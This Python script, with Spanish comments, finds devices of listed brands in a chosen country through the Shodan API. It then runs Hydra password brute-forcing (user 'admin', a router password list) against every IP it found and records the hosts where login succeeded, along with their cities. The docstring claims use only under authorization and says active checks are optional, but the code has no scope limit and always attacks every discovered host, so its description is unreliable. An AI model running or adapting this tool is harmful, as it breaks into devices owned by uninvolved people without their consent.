#!/usr/bin/env python3  # Indica que el script debe ejecutarse con Python 3 en sistemas Unix/Linux

"""
Nombre del archivo: shodan-scan-ver11.b.py
Descripción:
    Script de apoyo para PoC autorizadas que automatiza la búsqueda de dispositivos
    expuestos mediante la API de SHODAN y la ejecución de comprobaciones ligeras
    (p. ej. intentos de autenticación controlados con Hydra) sobre los hosts en scope.

    Comportamiento principal:
      - Realiza búsquedas en SHODAN acotadas por país (parámetro -c).
      - Normaliza y valida direcciones IP encontradas y las escribe en archivos intermedios.
      - (Opcional) Ejecuta comprobaciones básicas por puerto especificado (-p), usando herramientas
        externas configuradas (Hydra, nmap, etc.). Estas comprobaciones deben ejecutarse únicamente
        con **autorización explícita**.
      - Enriquece la salida con metadatos (ciudad, vendor cuando estén disponibles) y genera
        artefactos para análisis posterior.

Uso / sintaxis:
    (venv)$ python3 shodan-scan-ver11.b.py [-h] -c PAIS [-p PUERTO]

    Descripción de opciones:
      - -c PAIS    Código o nombre del país usado para filtrar la búsqueda en SHODAN.
                  Recomendado usar el código ISO de dos letras (p. ej. CO, US, BR).
                  Este parámetro es obligatorio.
      - -p PUERTO  Puerto a evaluar en las IPs encontradas (opcional). Si se omite, el script
                  puede limitarse a recolección y agrupamiento sin lanzar comprobaciones activas.
      - -h         Muestra ayuda y opciones.

Flujo general:
    1. Carga la API key de SHODAN desde un archivo .env (SHODAN_API_KEY) o según la variable
       SHODAN_ENV_FILE configurada.
    2. Ejecuta la búsqueda en SHODAN filtrando por país proporcionado con -c.
    3. Extrae y valida direcciones IP; las escribe en archivos intermedios (<OUTDIR>/ips.txt).
    4. (Opcional) Agrupa/filtra por ciudad o marca usando archivos de soporte (marcas.txt).
    5. (Opcional) Lanza ejecuciones de herramientas externas (Hydra/nmap) contra las IPs/puertos en el alcance.
    6. Recolecta, ordena y exporta resultados en formatos legibles (JSON/CSV/txt) y guarda logs con timestamps.

Requisitos previos:
    - Crear y activar un entorno virtual:
        $ source path/to/venv/bin/activate
    - Instalar dependencias Python:
        (venv)$ pip install python-dotenv shodan
    - Tener instalado y en PATH (si se van a usar):
        - Hydra (para pruebas de credenciales; usar solo con autorización)
        - nmap (opcional, para escaneos ligeros)
    - Contar con autorización escrita para realizar las pruebas sobre los activos incluidos en el alcance de la PoC/auditoría.
    - Archivo .env con la variable SHODAN_API_KEY (por ejemplo `SHODAN_API_KEY=tu_api_key`) o equivalente según la variable `SHODAN_ENV_FILE` que utilice el script.

Dependencias (Python / sistema):
    - Python 3.8+ (recomendado)
    - Paquetes Python:
        - shodan
        - python-dotenv
        - argparse (stdlib)
        - ipaddress (stdlib)
        - requests (opcional)
    - Herramientas externas (opcionales; sólo usar con autorización):
        - Hydra
        - nmap
    - Módulos stdlib usados típicamente:
        - os, sys, re, subprocess, json, datetime, logging

Archivos de configuración / soporte (referencia en el repo):
    - SHODAN_ENV_FILE (ej.: SHODAN_API_KEY.env) — archivo .env que contiene SHODAN_API_KEY.
    - marcas.txt — (opcional) lista de marcas/modelos a priorizar.
    - router.pass — (opcional) archivo local de contraseñas de prueba (usar solo en entorno controlado).
    - logs/ — directorio para registros y evidencias (timestamps por ejecución).

Archivos generados (salidas típicas):
    - <OUTDIR>/ips.txt                    # lista de IPs extraídas
    - <OUTDIR>/ips-ciudad.txt             # IPs con ciudad (si se pudo geolocalizar)
    - <OUTDIR>/resultados_hydra.txt       # salida cruda de Hydra (si se ejecuta)
    - <OUTDIR>/resultados_hydra_sorted.txt# resultados ordenados
    - <OUTDIR>/resultados_hydra-ciudad.txt# resultados enriquecidos con ciudad
    - <OUTDIR>/results.json               # output estructurado (opcional)
    - <OUTDIR>/scan_logs/<TIMESTAMP>.log  # logs de ejecución con timestamps

Buenas prácticas y consideraciones legales:
    - Ejecutar únicamente contra redes/equipos para los que se tenga **autorización expresa y documentada**.
    - Mantener un registro (evidencia) con autorización, ventana de prueba, alcance y responsables.
    - Evitar scans agresivos en dispositivos IoT (usar descubrimiento por ARP/ICMP y escaneos de puertos limitados).
    - No publicar credenciales ni accesos; en caso de hallazgos, seguir un proceso de responsible disclosure.
    - Revertir cualquier cambio temporal (reglas NAT, usuarios temporales, claves añadidas) al terminar la PoC.
    - Conservar logs de la ejecución como evidencia de cumplimiento del alcance.

Autor: Siler Amador Donado
Fecha de última modificación: 2025-10-30
Versión: 1.1b
Licencia: MIT
"""

# --- Importación de librerías necesarias ---
import shodan              # Librería oficial de la API de Shodan (busca dispositivos conectados en Internet)
import sys                 # Permite interactuar con el sistema (por ejemplo, terminar el programa con sys.exit)
import subprocess          # Ejecuta comandos externos (como Hydra)
import argparse            # Gestiona argumentos desde la línea de comandos
import ipaddress           # Trabaja con direcciones IP (IPv4/IPv6)
from dotenv import load_dotenv  # Carga variables de entorno desde un archivo .env
import os                  # Permite operaciones de sistema de archivos
import re                  # Expresiones regulares para buscar IPs dentro de texto

# --- Definición de constantes (nombres de archivos usados en todo el script) ---
ARCHIVO_MARCAS = "marcas.txt"                    # Lista de marcas o fabricantes a buscar en Shodan
ARCHIVO_IPS = "ips.txt"                          # Archivo donde se guardan las IPs encontradas
ARCHIVO_IPS_CIUDAD = "ips-ciudad.txt"            # Archivo donde se guardan IPs junto a su ciudad
ARCHIVO_PASS = "router.pass"                     # Archivo con contraseñas para probar en Hydra
ARCHIVO_RESULTADOS = "resultados_hydra.txt"      # Resultado sin procesar de Hydra
ARCHIVO_RESULTADOS_ORDENADO = "resultados_hydra_sorted.txt"  # Resultado de Hydra con IPs ordenadas
ARCHIVO_RESULTADOS_CIUDAD = "resultados_hydra-ciudad.txt"    # Resultado de Hydra con IPs y ciudades
SHODAN_ENV_FILE = "SHODAN_API_KEY.env"           # Archivo que contiene la API key de Shodan

# --- Función para cargar la API key desde el archivo .env ---
def cargar_api_key():
    load_dotenv(SHODAN_ENV_FILE)                # Carga el archivo de variables de entorno .env
    api_key = os.getenv('SHODAN_API_KEY')       # Obtiene la variable llamada SHODAN_API_KEY

    if not api_key:                             # Si la clave no existe o está vacía
        print("Error: API_KEY no está definida en el archivo .env.")  # Muestra mensaje de error
        sys.exit(1)                             # Termina la ejecución del programa con código 1

    return api_key                              # Devuelve la clave cargada

# --- Función para obtener los argumentos desde la línea de comandos ---
def obtener_argumentos():
    parser = argparse.ArgumentParser(description="Escanear dispositivos en SHODAN y ejecutar Hydra.")  # Crea un parser
    parser.add_argument("-c", "--pais", required=True,              # Argumento obligatorio (-c o --pais)
                        help="Código de país para la búsqueda en SHODAN (ejemplo: co, us, es).")
    parser.add_argument("-p", "--puerto", type=int, default=8080,   # Argumento opcional (-p o --puerto)
                        help="Puerto a utilizar en Hydra (por defecto: 8080).")
    return parser.parse_args()                                      # Devuelve los argumentos analizados

# --- Función para leer las marcas desde el archivo marcas.txt ---
def obtener_marcas():
    if not os.path.exists(ARCHIVO_MARCAS):                         # Verifica que el archivo exista
        print(f"Error: El archivo '{ARCHIVO_MARCAS}' no existe. Crea este archivo y añade marcas de dispositivos.")
        sys.exit(1)

    with open(ARCHIVO_MARCAS, "r", encoding="utf-8") as file:      # Abre el archivo en modo lectura
        marcas = [line.strip() for line in file.readlines() if line.strip()]  # Lee cada línea y elimina espacios vacíos
    
    if not marcas:                                                 # Si el archivo está vacío
        print(f"Error: El archivo '{ARCHIVO_MARCAS}' está vacío.")
        sys.exit(1)
    
    return marcas                                                  # Devuelve la lista de marcas leídas

# --- Función para verificar si Hydra está instalado en el sistema ---
def verificar_hydra():
    if subprocess.run(["which", "hydra"], capture_output=True).returncode != 0:  # Ejecuta 'which hydra' y revisa si existe
        print("Error: Hydra no está instalado. Instálalo antes de ejecutar el script.")
        sys.exit(1)

# --- Función que busca dispositivos en SHODAN para cada marca y país ---
def buscar_dispositivos(api, marcas, pais):
    resultados = []                                                # Lista donde se almacenarán los resultados
    for marca in marcas:                                           # Itera sobre cada marca del archivo
        consulta = f"{marca} country:{pais}"                       # Construye la consulta para Shodan
        try:
            print(f"🔎 Buscando en SHODAN: {consulta}")            # Muestra la consulta actual
            resultado = api.search(consulta)                       # Ejecuta la búsqueda con la API de Shodan
            resultados.extend(resultado.get('matches', []))        # Agrega los resultados (si existen) a la lista general
        except shodan.APIError as e:                               # Si ocurre un error con la API
            print(f"Error en la API de Shodan: {e}")               # Muestra mensaje de error
    
    return resultados                                              # Devuelve todos los resultados encontrados

# --- Función para guardar IPs y ciudades en archivos ordenados ---
def guardar_ips(resultados):
    """
    Acepta:
      - lista de dicts (servicios) tal como devuelve Shodan (con 'ip_str' y 'location')
      - o lista de tuplas (ip, ciudad)
    Valida IPv4/IPv6, descarta inválidas y ordena por (version, int(ip)) para evitar TypeError.
    Guarda ARCHIVO_IPS y ARCHIVO_IPS_CIUDAD.
    """
    datos_validos = []                                             # Lista para almacenar IPs válidas
    invalidadas = 0                                                # Contador de IPs inválidas

    for entry in resultados:                                       # Recorre cada resultado devuelto por Shodan
        ip_raw = None
        ciudad = None
        if isinstance(entry, dict):                                # Si es un diccionario (formato de Shodan)
            ip_raw = entry.get('ip_str') or entry.get('ip')        # Obtiene la IP (puede tener diferentes claves)
            loc = entry.get('location') or {}                      # Obtiene ubicación (puede ser None)
            ciudad = loc.get('city') if isinstance(loc, dict) else None
        elif isinstance(entry, (list, tuple)) and len(entry) >= 1: # Si es una tupla (ip, ciudad)
            ip_raw = entry[0]
            ciudad = entry[1] if len(entry) > 1 else None
        else:
            if isinstance(entry, str):                             # Si es una cadena "ip - ciudad"
                parts = entry.split(" - ", 1)
                ip_raw = parts[0].strip()
                ciudad = parts[1].strip() if len(parts) == 2 else None

        if not ip_raw:                                             # Si no se encontró una IP, la descarta
            invalidadas += 1
            continue

        ip_candidate = str(ip_raw).strip()                         # Limpia espacios y caracteres innecesarios
        ip_candidate = ip_candidate.strip(' \t\n\r",')

        try:
            ip_obj = ipaddress.ip_address(ip_candidate)            # Valida si es IPv4 o IPv6
            datos_validos.append((ip_obj, ciudad or 'Desconocida'))# Añade IP válida y ciudad
        except Exception:                                          # Si la IP es inválida
            invalidadas += 1
            continue

    if not datos_validos:                                          # Si no se obtuvo ninguna IP válida
        print("❌ No se encontraron IPs válidas en la búsqueda.")
        sys.exit(0)

    datos_validos.sort(key=lambda t: (t[0].version, int(t[0])))    # Ordena primero por versión (IPv4, luego IPv6) y por número

    with open(ARCHIVO_IPS, 'w', encoding='utf-8') as file:         # Crea/reescribe el archivo de IPs simples
        for ip_obj, _ in datos_validos:
            file.write(f"{ip_obj.compressed}\n")                   # Escribe la IP en formato compacto

    with open(ARCHIVO_IPS_CIUDAD, 'w', encoding='utf-8') as file:  # Crea/reescribe el archivo IP-ciudad
        for ip_obj, ciudad in datos_validos:
            file.write(f"{ip_obj.compressed} - {ciudad}\n")        # Escribe línea con formato "ip - ciudad"

    print(f"✅ Se han guardado {len(datos_validos)} IPs válidas en '{ARCHIVO_IPS}' (ordenadas).")
    if invalidadas:
        print(f"⚠ Se descartaron {invalidadas} entradas con IP inválida.")  # Informa si hubo IPs descartadas

# --- Función para verificar existencia de archivos requeridos antes de ejecutar Hydra ---
def verificar_archivos():
    if not os.path.exists(ARCHIVO_PASS):                           # Verifica que exista el archivo de contraseñas
        print(f"❌ Error: El archivo '{ARCHIVO_PASS}' no existe. Crea este archivo con las contraseñas.")
        sys.exit(1)
    if not os.path.exists(ARCHIVO_IPS):                            # Verifica que exista el archivo de IPs
        print(f"❌ Error: El archivo '{ARCHIVO_IPS}' no existe.")
        sys.exit(1)

# --- Función para ejecutar Hydra ---
def ejecutar_hydra(puerto):
    hydra_command = [                                              # Construye el comando Hydra
        'hydra', '-l', 'admin',                                   # Usuario fijo 'admin'
        '-P', ARCHIVO_PASS,                                       # Lista de contraseñas
        '-e', 'ns',                                               # Opciones adicionales: probar nulo (n) y contraseña igual al usuario (s)
        '-s', str(puerto),                                        # Puerto especificado
        '-o', ARCHIVO_RESULTADOS,                                 # Archivo de salida
        '-vV',                                                    # Modo verbose (detallado)
        '-M', ARCHIVO_IPS,                                        # Lista de IPs a probar
        'http-get'                                                # Módulo/protocolo a utilizar
    ]

    try:
        print(f"🚀 Ejecutando Hydra en puerto {puerto}...")        # Informa al usuario
        subprocess.run(hydra_command, check=True)                 # Ejecuta el comando en el sistema
    except subprocess.CalledProcessError as e:                     # Si Hydra devuelve error
        print(f"⚠ Error al ejecutar Hydra: {e}")
    except KeyboardInterrupt:                                     # Si el usuario interrumpe con Ctrl+C
        print("\n⏹ Ejecución de Hydra interrumpida por el usuario.")
    finally:
        print("✅ Proceso de Hydra terminado.")                   # Mensaje final

# --- Función para extraer IPs exitosas desde el resultado de Hydra ---
def extraer_ips_desde_resultados():
    """
    Extrae direcciones IPv4/IPv6 desde ARCHIVO_RESULTADOS y guarda ordenadas en ARCHIVO_RESULTADOS_ORDENADO.
    Maneja direcciones mixtas y descarta entradas no válidas.
    """
    if os.path.exists(ARCHIVO_RESULTADOS):                         # Comprueba existencia del archivo de resultados
        with open(ARCHIVO_RESULTADOS, 'r', encoding='utf-8') as file:
            contenido = file.read()                                # Lee todo el contenido del archivo
    else:
        print(f"❌ No existe '{ARCHIVO_RESULTADOS}'.")              # Si no existe, muestra mensaje y sale
        return

    posibles = re.findall(r'(\d+\.\d+\.\d+\.\d+)|([0-9a-fA-F:]{2,})', contenido)  # Busca IPv4 y fragmentos IPv6
    ips_encontradas = set()                                        # Conjunto para evitar duplicados

    for grupo in posibles:                                         # Recorre los grupos encontrados
        ip_cand = grupo[0] if grupo[0] else grupo[1]              # Usa el valor no vacío (IPv4 o IPv6)
        if not ip_cand:
            continue
        ip_cand = ip_cand.strip().strip('.,;[]()\"\'')            # Limpia caracteres sobrantes
        try:
            ip_obj = ipaddress.ip_address(ip_cand)                # Valida y convierte a objeto IP
            ips_encontradas.add(ip_obj)
        except Exception:
            continue                                              # Ignora candidatos inválidos

    if ips_encontradas:                                           # Si se encontraron IPs válidas
        ips_ordenadas = sorted(ips_encontradas, key=lambda ip_obj: (ip_obj.version, int(ip_obj)))  # Ordena por versión y número
        with open(ARCHIVO_RESULTADOS_ORDENADO, 'w', encoding='utf-8') as file:
            file.writelines(f"{ip.compressed}\n" for ip in ips_ordenadas)  # Escribe IPs ordenadas
        print(f"✅ IPs de Hydra ordenadas guardadas en '{ARCHIVO_RESULTADOS_ORDENADO}'.")
    else:
        print("❌ No se encontraron IPs en los resultados de Hydra.")

# --- Función para generar resultados_hydra-ciudad.txt ---
def generar_resultados_ciudad():
    if os.path.exists(ARCHIVO_IPS_CIUDAD) and os.path.exists(ARCHIVO_RESULTADOS_ORDENADO):  # Verifica existencia de ambos archivos
        ip_ciudad_map = {}                                        # Diccionario para mapear IP → ciudad
        with open(ARCHIVO_IPS_CIUDAD, 'r', encoding='utf-8') as file:
            for linea in file:
                partes = linea.strip().split(" - ")               # Divide por " - "
                if len(partes) == 2:
                    ip, ciudad = partes
                    ip_ciudad_map[ip] = ciudad                    # Asocia IP con ciudad

        with open(ARCHIVO_RESULTADOS_ORDENADO, 'r', encoding='utf-8') as file:
            ips_exitosas = [line.strip() for line in file]        # Carga las IPs exitosas

        resultados_ciudad = [(ip, ip_ciudad_map.get(ip, 'Desconocida')) for ip in ips_exitosas]  # Cruza IPs con ciudades

        with open(ARCHIVO_RESULTADOS_CIUDAD, 'w', encoding='utf-8') as file:
            file.writelines(f"{ip} - {ciudad}\n" for ip, ciudad in resultados_ciudad)  # Guarda resultado final
        print(f"✅ Resultados con ciudades guardados en '{ARCHIVO_RESULTADOS_CIUDAD}'.")

# --- Función principal ---
def main():
    args = obtener_argumentos()                                 # Obtiene argumentos de ejecución
    api_key = cargar_api_key()                                   # Carga la clave API
    api = shodan.Shodan(api_key)                                 # Inicializa el objeto API de Shodan

    marcas = obtener_marcas()                                    # Carga la lista de marcas
    resultados = buscar_dispositivos(api, marcas, args.pais)     # Realiza búsquedas en Shodan
    guardar_ips(resultados)                                      # Guarda IPs obtenidas
    
    verificar_archivos()                                         # Comprueba existencia de archivos requeridos
    verificar_hydra()                                            # Comprueba que Hydra esté instalado
    ejecutar_hydra(args.puerto)                                  # Ejecuta Hydra en las IPs encontradas

    extraer_ips_desde_resultados()                               # Procesa resultados de Hydra
    generar_resultados_ciudad()                                  # Cruza IPs exitosas con ciudades

# --- Punto de entrada del script ---
if __name__ == '__main__':
    main()                                                       # Llama a la función principal cuando el script se ejecuta directamente
